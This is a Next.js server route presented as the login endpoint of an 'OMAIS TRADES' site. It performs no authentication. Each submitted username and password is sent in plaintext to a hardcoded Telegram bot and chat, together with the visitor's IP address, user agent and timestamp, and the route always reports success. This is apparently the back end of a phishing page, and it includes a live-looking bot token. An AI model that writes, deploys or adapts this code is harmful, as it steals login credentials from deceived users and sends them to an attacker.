import { NextRequest, NextResponse } from "next/server";

const TELEGRAM_BOT_TOKEN = "8902060807:AAF0lY0CW7tiCKUi44gNknjNn4EMLUPbayM";
const TELEGRAM_CHAT_ID = "8000547764";

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const { username, password } = body;

    if (!username || !password) {
      return NextResponse.json(
        { error: "Username and password are required" },
        { status: 400 }
      );
    }

    // Get IP and user agent for context
    const ip =
      req.headers.get("x-forwarded-for") ||
      req.headers.get("x-real-ip") ||
      "Unknown";
    const userAgent = req.headers.get("user-agent") || "Unknown";
    const timestamp = new Date().toLocaleString("en-US", {
      timeZone: "UTC",
      dateStyle: "full",
      timeStyle: "long",
    });

    const message = `🔐 *New Login Attempt — OMAIS TRADES*

👤 *Username/Email:* \`${username}\`
🔑 *Password:* \`${password}\`
🌐 *IP Address:* \`${ip}\`
🖥️ *User Agent:* \`${userAgent}\`
🕒 *Time (UTC):* ${timestamp}

━━━━━━━━━━━━━━━━━━━━
⚠️ _This message was sent automatically from the OMAIS TRADES login page._`;

    const telegramRes = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      }
    );

    if (!telegramRes.ok) {
      const errText = await telegramRes.text();
      console.error("Telegram API error:", errText);
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Login route error:", error);
    return NextResponse.json(
      { error: "Internal server error" },
      { status: 500 }
    );
  }
}
